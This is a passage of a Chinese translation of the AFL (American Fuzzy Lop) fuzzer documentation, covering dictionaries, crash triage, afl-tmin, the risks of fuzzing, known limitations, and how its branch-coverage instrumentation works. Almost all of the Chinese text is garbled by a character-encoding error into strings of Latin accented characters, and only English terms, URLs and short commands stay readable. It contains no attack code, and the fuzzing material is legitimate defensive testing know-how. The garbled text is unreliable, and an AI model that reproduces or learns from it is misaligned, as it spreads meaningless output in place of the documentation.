¸ç³»ç»Ÿä¸Šï¼Œå¹¶è¡ŒåŒ–æ˜¯å……åˆ†åˆ©ç”¨ç¡¬ä»¶æ‰€å¿…éœ€çš„ã€‚æœ‰å…³å¦‚ä½•åœ¨å¤šä¸ªæ ¸å¿ƒæˆ–å¤šä¸ªè”ç½‘è®¡ç®—æœºä¸Šæ¨¡ç³Šå¸¸è§ç›®æ ‡çš„æç¤ºï¼Œè¯·å‚é˜…parallel_fuzzing.txtã€‚å¹¶è¡Œæ¨¡ç³Šæµ‹è¯•æ¨¡å¼ è¿˜æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹æ³•ï¼Œç”¨äºå°†AFLè¿æ¥åˆ°å…¶ä»–æ¨¡ç³Šå™¨ï¼ŒåŠ¨æ€ç¬¦å·æ‰§è¡Œï¼ˆconcrete and symbolicï¼Œ concolic executionï¼‰å¼•æ“ç­‰ç­‰; å†æ¬¡ï¼Œè¯·å‚é˜… parallel_fuzzing.txtçš„æœ€åä¸€èŠ‚ä»¥è·å–æç¤ºã€‚ 9ï¼‰Fuzzerè¯å…¸é»˜è®¤æƒ…å†µä¸‹ï¼Œafl-fuzzå˜å¼‚å¼•æ“é’ˆå¯¹ç´§å‡‘æ•°æ®æ ¼å¼è¿›è¡Œäº†ä¼˜åŒ– - ä¾‹å¦‚ï¼Œå›¾åƒï¼Œå¤šåª’ä½“ï¼Œå‹ç¼©æ•°æ®ï¼Œæ­£åˆ™è¡¨è¾¾å¼è¯­æ³•æˆ–shellè„šæœ¬ã€‚å®ƒæœ‰ç‚¹ä¸å¤ªé€‚åˆå…·æœ‰ç‰¹åˆ«å†—é•¿å’Œå†—ä½™çš„è¯­è¨€çš„è¯­è¨€ - ç‰¹åˆ«æ˜¯åŒ…æ‹¬HTMLï¼ŒSQLæˆ–JavaScriptã€‚ä¸ºäº†é¿å…æ„å»ºè¯­æ³•æ„ŸçŸ¥å·¥å…·çš„éº»çƒ¦ï¼Œafl-fuzzæä¾›äº†ä¸€ç§æ–¹æ³•ï¼Œä½¿ç”¨ä¸ç›®æ ‡æ•°æ®ç±»å‹ç›¸å…³è”çš„å…¶ä»–ç‰¹æ®Šæ ‡è®°çš„è¯­è¨€å…³é”®å­—ï¼Œé­”æœ¯å¤´æˆ–å¯é€‰å­—å…¸ä¸ºæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹è®¾å®šç§å­ï¼Œå¹¶ä½¿ç”¨å®ƒæ¥é‡å»ºåº•å±‚éšæ—¶éšåœ°çš„è¯­æ³•ï¼šhttp://lcamtâ€‹â€‹uf.blogspot.com/2015/01/afl-fuzz-making-up-grammar-with.htmlè¦ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œé¦–å…ˆéœ€è¦ä½¿ç”¨dictionaries/README.dictionariesä¸­è®¨è®ºçš„ä¸¤ç§æ ¼å¼ä¹‹ä¸€åˆ›å»ºå­—å…¸;ç„¶åé€šè¿‡å‘½ä»¤è¡Œä¸­çš„-xé€‰é¡¹å°†æ¨¡ç³Šå™¨æŒ‡å‘å®ƒã€‚ï¼ˆè¯¥å­ç›®å½•ä¸­ä¹Ÿå·²æä¾›äº†å‡ ä¸ªå¸¸ç”¨å­—å…¸ã€‚ï¼‰æ²¡æœ‰åŠæ³•æä¾›åŸºç¡€è¯­æ³•çš„æ›´å¤šç»“æ„åŒ–æè¿°ï¼Œä½†æ¨¡ç³Šå™¨å¯èƒ½ä¼šæ ¹æ®instrumentationåé¦ˆå•ç‹¬æ‰¾å‡ºä¸€äº›ã€‚è¿™å®é™…ä¸Šåœ¨å®è·µä¸­æœ‰æ•ˆï¼Œæ¯”å¦‚è¯´ï¼šhttp://lcamtâ€‹â€‹uf.blogspot.com/2015/04/finding-bugs-in-sqlite-easy-way.htmlPSã€‚å³ä½¿æ²¡æœ‰ç»™å‡ºæ˜ç¡®çš„å­—å…¸ï¼Œafl-fuzzä¹Ÿä¼šå°è¯•é€šè¿‡åœ¨ç¡®å®šæ€§å­—èŠ‚ç¿»è½¬æœŸé—´éå¸¸æ¥è¿‘åœ°è§‚å¯Ÿinstrumentationæ¥æå–è¾“å…¥è¯­æ–™åº“ä¸­çš„ç°æœ‰è¯­æ³•æ ‡è®°ã€‚è¿™é€‚ç”¨äºæŸäº›ç±»å‹çš„è§£æå™¨å’Œè¯­æ³•ï¼Œä½†ä¸å¦‚-xæ¨¡å¼å¥½ã€‚å¦‚æœå­—å…¸çœŸçš„å¾ˆéš¾æ‰¾åˆ°ï¼Œå¦ä¸€ä¸ªé€‰æ‹©æ˜¯è®©AFLè¿è¡Œä¸€æ®µæ—¶é—´ï¼Œç„¶åä½¿ç”¨ä½œä¸ºAFLä¼´éšå®ç”¨ç¨‹åºçš„ä»¤ç‰Œæ•è·åº“ã€‚ä¸ºæ­¤ï¼Œè¯·å‚é˜…libtokencap/README.tokencapã€‚ 10ï¼‰å´©æºƒåˆ†ç±»åŸºäºcoverageçš„å´©æºƒåˆ†ç»„é€šå¸¸ä¼šç”Ÿæˆä¸€ä¸ªå°å‹æ•°æ®é›†ï¼Œå¯ä»¥æ‰‹åŠ¨æˆ–ä½¿ç”¨éå¸¸ç®€å•çš„GDBæˆ–Valgrindè„šæœ¬å¿«é€Ÿè¿›è¡Œåˆ†ç±»ã€‚æ¯æ¬¡å´©æºƒéƒ½å¯ä»¥è¿½æº¯åˆ°é˜Ÿåˆ—ä¸­çš„çˆ¶çº§éå´©æºƒæµ‹è¯•ç”¨ä¾‹ï¼Œä»è€Œæ›´å®¹æ˜“è¯Šæ–­æ•…éšœã€‚è¯è™½å¦‚æ­¤ï¼Œé‡è¦çš„æ˜¯è¦æ‰¿è®¤ï¼Œå¦‚æœæ²¡æœ‰å¤§é‡çš„è°ƒè¯•å’Œä»£ç åˆ†æå·¥ä½œï¼Œä¸€äº›æ¨¡ç³Šçš„å´©æºƒå¾ˆéš¾å¿«é€Ÿè¯„ä¼°å¯åˆ©ç”¨æ€§ã€‚ä¸ºäº†å¸®åŠ©å®Œæˆè¿™é¡¹ä»»åŠ¡ï¼Œafl-fuzzæ”¯æŒä½¿ç”¨-Cæ ‡å¿—å¯ç”¨çš„éå¸¸ç‹¬ç‰¹çš„â€œå´©æºƒæ¢ç´¢â€æ¨¡å¼ã€‚åœ¨æ­¤æ¨¡å¼ä¸‹ï¼Œæ¨¡ç³Šå™¨å°†ä¸€ä¸ªæˆ–å¤šä¸ªå´©æºƒæµ‹è¯•ç”¨ä¾‹ä½œä¸ºè¾“å…¥ï¼Œå¹¶ä½¿ç”¨å…¶åé¦ˆé©±åŠ¨çš„æ¨¡ç³Šæµ‹è¯•ç­–ç•¥ï¼Œéå¸¸å¿«é€Ÿåœ°æšä¸¾ç¨‹åºä¸­å¯ä»¥è¾¾åˆ°çš„æ‰€æœ‰ä»£ç è·¯å¾„ï¼ŒåŒæ—¶ä½¿å…¶ä¿æŒåœ¨å´©æºƒçŠ¶æ€ã€‚ä¸ä¼šå¯¼è‡´å´©æºƒçš„å˜å¼‚ä¼šè¢«æ‹’ç»;ä»»ä½•ä¸å½±å“æ‰§è¡Œè·¯å¾„çš„æ›´æ”¹ä¹Ÿæ˜¯å¦‚æ­¤ã€‚è¾“å‡ºæ˜¯ä¸€ä¸ªå°æ–‡ä»¶é›†ï¼Œå¯ä»¥éå¸¸å¿«é€Ÿåœ°æ£€æŸ¥ä»¥æŸ¥çœ‹æ”»å‡»è€…å¯¹é”™è¯¯åœ°å€çš„æ§åˆ¶ç¨‹åº¦ï¼Œæˆ–è€…æ˜¯å¦æœ‰å¯èƒ½è¶…è¿‡åˆå§‹è¶Šç•Œè¯»å–ï¼Œå¹¶æŸ¥çœ‹ä¸‹é¢çš„å†…å®¹ã€‚ å“¦ï¼Œè¿˜æœ‰ä¸€ä»¶äº‹ï¼šå¯¹äºæµ‹è¯•ç”¨ä¾‹æœ€å°åŒ–ï¼Œè¯·å°è¯•afl-tminã€‚è¯¥å·¥å…·å¯ä»¥ä»¥éå¸¸ç®€å•çš„æ–¹å¼æ“ä½œï¼š$ ./afl-tmin -i test_case -o minimize_result - /path/to/program [...] è¯¥å·¥å…·é€‚ç”¨äºå´©æºƒå’Œéå´©æºƒçš„æµ‹è¯•ç”¨ä¾‹ã€‚åœ¨å´©æºƒæ¨¡å¼ä¸‹ï¼Œå®ƒå°†å¾ˆä¹æ„æ¥å— instrumented å’Œ non-instrumented çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚åœ¨éå´©æºƒæ¨¡å¼ä¸‹ï¼Œæœ€å°åŒ–å™¨ä¾èµ–äºæ ‡å‡†AFLæ£€æµ‹æ¥ä½¿æ–‡ä»¶æ›´ç®€å•è€Œä¸æ”¹å˜æ‰§è¡Œè·¯å¾„ã€‚minimizerä¸afl-fuzzå…¼å®¹çš„æ–¹å¼æ¥å—-mï¼Œ-tï¼Œ-få’Œ@@è¯­æ³•ã€‚å¦‚æœæŒ‡å®šäº†å‚æ•°-xï¼Œå³crash modeï¼Œä¼šæŠŠå¯¼è‡´ç¨‹åºéæ­£å¸¸é€€å‡ºçš„æ–‡ä»¶ç›´æ¥å‰”é™¤ã€‚ AFLçš„å¦ä¸€ä¸ªæ–°æˆå‘˜æ˜¯afl-analyzeå·¥å…·ã€‚éœ€è¦è¾“å…¥æ–‡ä»¶ï¼Œå°è¯•æŒ‰é¡ºåºç¿»è½¬å­—èŠ‚ï¼Œå¹¶è§‚å¯Ÿæµ‹è¯•ç¨‹åºçš„è¡Œä¸ºã€‚ç„¶åæ ¹æ®å“ªäº›éƒ¨åˆ†çœ‹èµ·æ¥æ˜¯å…³é”®çš„ï¼Œå“ªäº›éƒ¨åˆ†ä¸æ˜¯å…³é”®çš„ï¼Œå¯¹è¾“å…¥è¿›è¡Œé¢œè‰²ç¼–ç ;è™½ç„¶ä¸æ˜¯ä¸‡èƒ½ï¼Œä½†å®ƒé€šå¸¸å¯ä»¥æä¾›å¯¹å¤æ‚æ–‡ä»¶æ ¼å¼çš„å¿«é€Ÿè§è§£ã€‚æœ‰å…³å…¶æ“ä½œçš„æ›´å¤šä¿¡æ¯å¯ä»¥åœ¨technical_details.txtçš„æœ«å°¾æ‰¾åˆ°ã€‚ 11ï¼‰è¶…è¶Šå´©æºƒæ¨¡ç³Šæµ‹è¯•æ˜¯ä¸€ç§å¾ˆå¥½çš„ï¼Œæœªå……åˆ†åˆ©ç”¨çš„æŠ€æœ¯ï¼Œç”¨äºå‘ç°éå´©æºƒçš„è®¾è®¡å’Œå®ç°é”™è¯¯ã€‚é€šè¿‡ä¿®æ”¹ç›®æ ‡ç¨‹åºè°ƒç”¨abort()æ—¶å‘ç°äº†ä¸€äº›æœ‰è¶£çš„é”™è¯¯ï¼Œæ¯”å¦‚ï¼š å½“ç»™å‡ºç›¸åŒçš„æ¨¡ç³Šè¾“å…¥æ—¶ï¼Œä¸¤ä¸ªbignumåº“äº§ç”Ÿä¸åŒçš„è¾“å‡ºï¼Œ å½“è¦æ±‚è¿ç»­å¤šæ¬¡è§£ç ç›¸åŒçš„è¾“å…¥å›¾åƒæ—¶ï¼Œå›¾åƒåº“ä¼šäº§ç”Ÿä¸åŒçš„è¾“å‡ºï¼Œ åœ¨å¯¹æ¨¡ç³Šæä¾›çš„æ•°æ®è¿›è¡Œè¿­ä»£åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ—¶ï¼Œåºåˆ—åŒ–/ååºåˆ—åŒ–åº“æ— æ³•ç”Ÿæˆç¨³å®šçš„è¾“å‡ºï¼Œ å½“è¦æ±‚å‹ç¼©ç„¶åè§£å‹ç¼©ç‰¹å®šblobæ—¶ï¼Œå‹ç¼©åº“ä¼šç”Ÿæˆä¸è¾“å…¥æ–‡ä»¶ä¸ä¸€è‡´çš„è¾“å‡ºã€‚å®æ–½è¿™äº›æˆ–ç±»ä¼¼çš„å¥å…¨æ€§æ£€æŸ¥é€šå¸¸åªéœ€è¦å¾ˆå°‘çš„æ—¶é—´;å¦‚æœä½ æ˜¯ç‰¹å®šåŒ…çš„ç»´æŠ¤è€…ï¼Œä½ å¯ä»¥ä½¿ç”¨#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTIONï¼ˆä¸€ä¸ªä¹Ÿä¸libfuzzerå…±äº«çš„æ ‡å¿—ï¼‰æˆ–#ifdef __AFL_COMPILERï¼ˆè¿™ä¸ªåªé€‚ç”¨äºAFLï¼‰æ¥ä½¿è¿™ä¸ªä»£ç æˆä¸ºæ¡ä»¶ã€‚ 12ï¼‰å¸¸è¯†æ€§é£é™©è¯·è®°ä½ï¼Œä¸è®¸å¤šå…¶ä»–è®¡ç®—å¯†é›†å‹ä»»åŠ¡ç±»ä¼¼ï¼Œæ¨¡ç³Šæµ‹è¯•å¯èƒ½ä¼šç»™æ‚¨çš„ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿå¸¦æ¥å‹åŠ›ã€‚ç‰¹åˆ«æ˜¯ï¼š ä½ çš„CPUä¼šå¾ˆçƒ­ï¼Œéœ€è¦å……åˆ†å†·å´ã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœå†·å´ä¸è¶³æˆ–åœæ­¢æ­£å¸¸å·¥ä½œï¼ŒCPUé€Ÿåº¦å°†è‡ªåŠ¨å—åˆ°é™åˆ¶ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå°¤å…¶æ˜¯åœ¨ä¸å¤ªåˆé€‚çš„ç¡¬ä»¶ï¼ˆç¬”è®°æœ¬ç”µè„‘ï¼Œæ™ºèƒ½æ‰‹æœºç­‰ï¼‰ä¸Šè¿›è¡Œæ¨¡ç³Šæµ‹è¯•æ—¶ï¼ŒæŸäº›äº‹æƒ…å¹¶éå®Œå…¨ä¸å¯èƒ½çˆ†å‘ã€‚ æœ‰é’ˆå¯¹æ€§çš„ç¨‹åºå¯èƒ½æœ€ç»ˆä¸æ­£å¸¸åœ°æŠ“å–åƒå…†å­—èŠ‚çš„å†…å­˜æˆ–ç”¨åƒåœ¾æ–‡ä»¶å¡«æ»¡ç£ç›˜ç©ºé—´ã€‚ AFLè¯•å›¾å¼ºåˆ¶æ‰§è¡ŒåŸºæœ¬çš„å†…å­˜é™åˆ¶ï¼Œä½†ä¸èƒ½é˜»æ­¢æ¯ä¸€ä¸ªå¯èƒ½çš„äº‹æ•…ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œæ‚¨ä¸åº”è¯¥å¯¹æ•°æ®ä¸¢å¤±å‰æ™¯ä¸å¯æ¥å—çš„ç³»ç»Ÿè¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‚ æ¨¡ç³Šæµ‹è¯•æ¶‰åŠæ•°åäº¿æ¬¡å¯¹æ–‡ä»¶ç³»ç»Ÿçš„è¯»å†™æ“ä½œã€‚åœ¨ç°ä»£ç³»ç»Ÿä¸­ï¼Œè¿™é€šå¸¸ä¼šè¢«é«˜åº¦ç¼“å­˜ï¼Œå¯¼è‡´ç›¸å½“é€‚åº¦çš„â€œç‰©ç†â€I/O - ä½†æ˜¯æœ‰è®¸å¤šå› ç´ å¯èƒ½ä¼šæ”¹å˜è¿™ä¸ªç­‰å¼ã€‚æ‚¨æœ‰è´£ä»»ç›‘æ§æ½œåœ¨çš„é—®é¢˜; I / Oéå¸¸ç¹é‡ï¼Œè®¸å¤šHDDå’ŒSSDçš„ä½¿ç”¨å¯¿å‘½å¯èƒ½ä¼šç¼©çŸ­ã€‚ç›‘è§†Linuxä¸Šç£ç›˜I/Oçš„ä¸€ç§å¥½æ–¹æ³•æ˜¯â€™iostatâ€™å‘½ä»¤ï¼š$ iostat -d 3 -x -k [...å¯é€‰ç£ç›˜ID ...] 13ï¼‰å·²çŸ¥çš„é™åˆ¶å’Œéœ€è¦æ”¹è¿›çš„é¢†åŸŸä»¥ä¸‹æ˜¯AFLçš„ä¸€äº›æœ€é‡è¦çš„è­¦å‘Šï¼š AFLé€šè¿‡æ£€æŸ¥ç”±äºä¿¡å·ï¼ˆSIGSEGVï¼ŒSIGABRTç­‰ï¼‰è€Œå¯¼è‡´çš„ç¬¬ä¸€ä¸ªè¡ç”Ÿè¿‡ç¨‹æ­»äº¡æ¥æ£€æµ‹æ•…éšœã€‚ä¸ºè¿™äº›ä¿¡å·å®‰è£…è‡ªå®šä¹‰å¤„ç†ç¨‹åºçš„ç¨‹åºå¯èƒ½éœ€è¦æ³¨é‡Šæ‰ç›¸å…³ä»£ç ã€‚åŒæ ·ï¼Œç”±æ¨¡ç³Šç›®æ ‡äº§ç”Ÿçš„å­å¤„ç†ä¸­çš„æ•…éšœå¯èƒ½ä¼šé€ƒé¿æ£€æµ‹ï¼Œé™¤éæ‚¨æ‰‹åŠ¨æ·»åŠ ä¸€äº›ä»£ç æ¥æ•è·å®ƒã€‚ ä¸ä»»ä½•å…¶ä»–å¼ºåŠ›å·¥å…·ä¸€æ ·ï¼Œå¦‚æœä½¿ç”¨åŠ å¯†ï¼Œæ ¡éªŒå’Œï¼ŒåŠ å¯†ç­¾åæˆ–å‹ç¼©æ¥å®Œå…¨åŒ…è£…è¦æµ‹è¯•çš„å®é™…æ•°æ®æ ¼å¼ï¼Œåˆ™æ¨¡ç³Šå™¨æä¾›æœ‰é™çš„è¦†ç›–èŒƒå›´ã€‚è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½ å¯ä»¥æ³¨é‡Šæ‰ç›¸å…³çš„æ£€æŸ¥ï¼ˆå‚è§experimental / libpng_no_checksum /è·å–çµæ„Ÿï¼‰;å¦‚æœè¿™æ˜¯ä¸å¯èƒ½çš„ï¼Œä½ ä¹Ÿå¯ä»¥ç¼–å†™ä¸€ä¸ªåå¤„ç†å™¨ï¼Œå¦‚experimental / post_library /ä¸­æ‰€è¿°ã€‚ ASANå’Œ64ä½äºŒè¿›åˆ¶æ–‡â€‹â€‹ä»¶å­˜åœ¨ä¸€äº›ä¸å¹¸çš„æƒè¡¡ã€‚è¿™ä¸æ˜¯å› ä¸ºä»»ä½•ç‰¹å®šçš„æ¨¡ç³Šé”™è¯¯;è¯·å‚é˜…notes_for_asan.txtä»¥è·å–æç¤ºã€‚ æ²¡æœ‰ç›´æ¥æ”¯æŒæ¨¡ç³Šç½‘ç»œæœåŠ¡ï¼Œåå°å®ˆæŠ¤ç¨‹åºæˆ–éœ€è¦UIäº¤äº’æ‰èƒ½å·¥ä½œçš„äº¤äº’å¼åº”ç”¨ç¨‹åºã€‚æ‚¨å¯èƒ½éœ€è¦è¿›è¡Œç®€å•çš„ä»£ç æ›´æ”¹ï¼Œä»¥ä½¿å®ƒä»¬ä»¥æ›´ä¼ ç»Ÿçš„æ–¹å¼è¿è¡Œã€‚ Preenyä¹Ÿå¯ä»¥æä¾›ä¸€ä¸ªç›¸å¯¹ç®€å•çš„é€‰é¡¹ - è¯·å‚é˜…ï¼šhttps://github.com/zardus/preenyæœ‰å…³ä¿®æ”¹åŸºäºç½‘ç»œçš„æœåŠ¡çš„ä¸€äº›æœ‰ç”¨æç¤ºä¹Ÿå¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°ï¼šhttps://www.fastly.com/blog/how-to-fuzz-server-american-fuzzy-lop AFLä¸è¾“å‡ºäººç±»å¯è¯»çš„è¦†ç›–æ•°æ®ã€‚å¦‚æœä½ æƒ³ç›‘æ§è¦†ç›–ï¼Œè¯·ä½¿ç”¨Michael Rashçš„afl-covï¼šhttpsï¼š//github.com/mrash/afl-cov å¶å°”ï¼Œæ•æ„Ÿçš„æœºå™¨ä¼šå¯¹æŠ—ä»–ä»¬çš„åˆ›é€ è€…ã€‚å¦‚æœæ‚¨é‡åˆ°è¿™ç§æƒ…å†µï¼Œè¯·è®¿é—®http://lcamtâ€‹â€‹uf.coredump.cx/prep/ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¯·å‚é˜…å®‰è£…ä»¥è·å–ç‰¹å®šäºå¹³å°çš„æç¤ºã€‚ 0x05 afl-fuzzç™½çš®ä¹¦æœ¬æ–‡æ¡£æä¾›äº†American Fuzzy Lopçš„ç®€å•çš„æ¦‚è¿°ã€‚æƒ³äº†è§£ä¸€èˆ¬çš„ä½¿ç”¨è¯´æ˜ï¼Œè¯·å‚è§ README ã€‚æƒ³äº†è§£AFLèƒŒåçš„åŠ¨æœºå’Œè®¾è®¡ç›®æ ‡ï¼Œè¯·å‚è§ historical_notes.txtã€‚ 0ï¼‰è®¾è®¡è¯´æ˜(Design statement)American Fuzzy Lop ä¸å…³æ³¨ä»»ä½•å•ä¸€çš„æ“ä½œè§„åˆ™(singular principle of operation)ï¼Œä¹Ÿä¸æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»»ä½•ç‰¹å®šç†è®ºçš„æ¦‚å¿µéªŒè¯(proof of concept)ã€‚è¿™ä¸ªå·¥å…·å¯ä»¥è¢«è®¤ä¸ºæ˜¯ä¸€ç³»åˆ—åœ¨å®è·µä¸­æµ‹è¯•è¿‡çš„hacksè¡Œä¸ºï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸ªå·¥å…·æƒŠäººçš„æœ‰æ•ˆã€‚æˆ‘ä»¬ç”¨ç›®å‰æœ€simpleä¸”æœ€robustçš„æ–¹æ³•å®ç°äº†è¿™ä¸ªå·¥å…·ã€‚å”¯ä¸€çš„è®¾è®¡å®—æ—¨åœ¨äºé€Ÿåº¦ã€å¯é æ€§å’Œæ˜“ç”¨æ€§ã€‚ 1ï¼‰è¦†ç›–ç‡è®¡ç®—(Coverage measurements)åœ¨ç¼–è¯‘è¿‡çš„ç¨‹åºä¸­æ’æ¡©èƒ½å¤Ÿæ•è·åˆ†æ”¯ï¼ˆè¾¹ç¼˜ï¼‰çš„è¦†ç›–ç‡ï¼Œå¹¶ä¸”è¿˜èƒ½æ£€æµ‹åˆ°ç²—ç•¥çš„åˆ†æ”¯æ‰§è¡Œå‘½ä¸­æ¬¡æ•°(branch-taken hit counts)ã€‚åœ¨åˆ†æ”¯ç‚¹æ³¨å…¥çš„ä»£ç å¤§è‡´å¦‚ä¸‹ï¼š 123cur_location = &lt;COMPILE_TIME_RANDOM&gt;; //ç”¨ä¸€ä¸ªéšæœºæ•°æ ‡è®°å½“å‰åŸºæœ¬å—shared_mem[cur_location ^ prev_location]++; //å°†å½“å‰å—å’Œå‰ä¸€å—å¼‚æˆ–ä¿å­˜åˆ°shared_mem[]prev_location = cur_location &gt;&gt; 1; //cur_locationå³ç§»1ä½åŒºåˆ†ä»å½“å‰å—åˆ°å½“å‰å—çš„è½¬è·³ cur_location çš„å€¼æ˜¯éšæœºäº§ç”Ÿçš„ï¼Œä¸ºçš„æ˜¯ç®€åŒ–è¿æ¥å¤æ‚å¯¹è±¡çš„è¿‡ç¨‹å’Œä¿æŒXORè¾“å‡ºåˆ†å¸ƒæ˜¯å‡åŒ€çš„ã€‚shared_mem[] æ•°ç»„æ˜¯ä¸€ä¸ªè°ƒç”¨è€… (caller) ä¼ ç»™è¢«æ’æ¡©çš„äºŒè¿›åˆ¶ç¨‹åºçš„64kBçš„å…±äº«ç©ºé—´ã€‚å…¶ä¸­çš„æ¯ä¸€å­—èŠ‚å¯ä»¥ç†è§£æˆå¯¹äºæ’æ¡©ä»£ç ä¸­ç‰¹åˆ«çš„å…ƒç»„(branch_src, branch_dst)çš„ä¸€æ¬¡å‘½ä¸­ï¼ˆhitï¼‰ã€‚é€‰æ‹©è¿™ä¸ªæ•°ç»„å¤§å°çš„åŸå› æ˜¯è®©å†²çª(collisions)å°½å¯èƒ½å‡å°‘ã€‚è¿™æ ·é€šå¸¸èƒ½å¤„ç†2kåˆ°10kçš„åˆ†æ”¯ç‚¹ã€‚åŒæ—¶ï¼Œå®ƒçš„å¤§å°ä¹Ÿè¶³ä»¥ä½¿è¾“å‡ºå›¾èƒ½åœ¨æ¥å—ç«¯è¾¾åˆ°æ¯«ç§’çº§çš„åˆ†æã€‚ Branch cnt Colliding tuples Example targets 1,000 0.75% giflib, lzo 2,000 1.5% zlib, tar, xz 5,000 3.5% libpng, libwebp 10,000 7% libxml 20,000 14% sqlite 50,000 30% - è¿™ç§å½¢å¼çš„è¦†ç›–ç‡ï¼Œç›¸å¯¹äºç®€å•çš„åŸºæœ¬å—è¦†ç›–ç‡æ¥è¯´ï¼Œå¯¹ç¨‹åºè¿è¡Œè·¯å¾„æä¾›äº†ä¸€ä¸ªæ›´å¥½çš„æè¿°(insight)ã€‚ç‰¹åˆ«åœ°ï¼Œå®ƒèƒ½å¾ˆå¥½åœ°åŒºåˆ†ä»¥ä¸‹ä¸¤ä¸ªæ‰§è¡Œè·¯å¾„ï¼š A -&gt; B -&gt; C -&gt; D -&gt; E (tuples: AB, BC, CD, DE) A -&gt; B -&gt; D -&gt; C -&gt; E (tuples: AB, BD, DC, CE) è¿™æœ‰åŠ©äºå‘ç°åº•å±‚ä»£ç çš„å¾®å°é”™è¯¯æ¡ä»¶ã€‚å› ä¸º å®‰å…¨æ¼æ´é€šå¸¸æ˜¯ä¸€äº›éé¢„æœŸ(æˆ–ä¸æ­£ç¡®)çš„è¯­å¥è½¬ç§»(ä¸€ä¸ªtupleå°±æ˜¯ä¸€ä¸ªè¯­å¥è½¬ç§») ï¼Œè€Œä¸æ˜¯æ²¡è¦†ç›–åˆ°æŸå—ä»£ç ã€‚ä¸Šè¾¹ä¼ªä»£ç çš„æœ€åä¸€è¡Œç§»ä½æ“ä½œæ˜¯ä¸ºäº†è®©tupleå…·æœ‰å®šå‘æ€§(æ²¡æœ‰è¿™ä¸€è¡Œçš„è¯ï¼ŒA^Bå’ŒB^Aå°±æ²¡åŒºåˆ«äº†ï¼ŒåŒæ ·ï¼ŒA^Aå’ŒB^Bä¹Ÿæ²¡åŒºåˆ«äº†)ã€‚é‡‡ç”¨å³ç§»çš„åŸå› è·ŸIntel CPUçš„ä¸€äº›ç‰¹æ€§æœ‰å…³ã€‚ 2ï¼‰å‘ç°æ–°è·¯å¾„(Detecting new behaviors)AFLçš„fuzzersä½¿ç”¨ä¸€ä¸ªå…¨å±€Mapæ¥å­˜å‚¨ä¹‹å‰æ‰§è¡Œæ—¶çœ‹åˆ°çš„tupleã€‚è¿™äº›æ•°æ®å¯ä»¥è¢«ç”¨æ¥å¯¹ä¸åŒçš„traceè¿›è¡Œå¿«é€Ÿå¯¹æ¯”ï¼Œä»è€Œå¯ä»¥è®¡ç®—å‡ºæ˜¯å¦æ–°æ‰§è¡Œäº†ä¸€ä¸ªdwordæŒ‡ä»¤/ä¸€ä¸ªqword-wideæŒ‡ä»¤/ä¸€ä¸ªç®€å•çš„å¾ªç¯ã€‚å½“ä¸€ä¸ªå˜å¼‚çš„è¾“å…¥äº§ç”Ÿäº†ä¸€ä¸ªåŒ…å«æ–°tupleçš„æ‰§è¡Œè·¯å¾„æ—¶ï¼Œå¯¹åº”çš„è¾“å…¥æ–‡ä»¶å°±è¢«ä¿å­˜ï¼Œç„¶åè¢«å‘é€åˆ°ä¸‹ä¸€è¿‡ç¨‹(è§ç¬¬3éƒ¨åˆ†)ã€‚å¯¹äºé‚£äº›æ²¡æœ‰äº§ç”Ÿæ–°è·¯å¾„çš„è¾“å…¥ï¼Œå°±ç®—ä»–ä»¬çš„instrumentationè¾“å‡ºæ¨¡å¼æ˜¯ä¸åŒçš„ï¼Œä¹Ÿä¼šè¢«æŠ›å¼ƒæ‰ã€‚è¿™ç§ç®—æ³•è€ƒè™‘äº†ä¸€ä¸ªéå¸¸ç»†ç²’åº¦çš„ã€é•¿æœŸçš„å¯¹ç¨‹åºçŠ¶æ€çš„æ¢ç´¢ï¼ŒåŒæ—¶å®ƒè¿˜ä¸å¿…æ‰§è¡Œå¤æ‚çš„è®¡ç®—ï¼Œä¸å¿…å¯¹æ•´ä¸ªå¤æ‚çš„æ‰§è¡Œæµè¿›è¡Œå¯¹æ¯”ï¼Œä¹Ÿé¿å…äº†è·¯å¾„çˆ†ç‚¸çš„å½±å“ã€‚ä¸ºäº†è¯´æ˜è¿™ä¸ªç®—æ³•æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œè€ƒè™‘ä¸‹é¢çš„ä¸¤ä¸ªè·¯å¾„ï¼Œç¬¬äºŒä¸ªè·¯å¾„å‡ºç°äº†æ–°çš„tuples(CA, AE):12#1: A -&gt; B -&gt; C -&gt; D -&gt; E#2: A -&gt; B -&gt; C -&gt; A -&gt; E å› ä¸º#2çš„åŸå› ï¼Œä»¥ä¸‹çš„è·¯å¾„å°±ä¸è®¤ä¸ºæ˜¯ä¸åŒçš„è·¯å¾„äº†ï¼Œå°½ç®¡çœ‹èµ·æ¥éå¸¸ä¸åŒï¼š#3: A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; A -&gt; B -&gt; C -&gt; D -&gt; E é™¤äº†æ£€æµ‹æ–°çš„tupleä¹‹å¤–ï¼ŒAFLçš„fuzzerä¹Ÿä¼šç²—ç•¥åœ°è®°å½•tupleçš„å‘½ä¸­æ•°(hit counts)ã€‚è¿™äº›è¢«åˆ†å‰²æˆå‡ ä¸ªbucketsï¼š1, 2, 3, 4-7, 8-15, 16-31, 32-127, 128+ ä»æŸç§æ„ä¹‰æ¥è¯´ï¼Œbucketsé‡Œè¾¹çš„æ•°ç›®æ˜¯æœ‰å®é™…æ„ä¹‰çš„ï¼šå®ƒæ˜¯ä¸€ä¸ª8-bit counterå’Œä¸€ä¸ª8-position bitmapçš„æ˜ å°„ã€‚8-bit counteræ˜¯ç”±æ¡©ç”Ÿæˆçš„ï¼Œ8-position 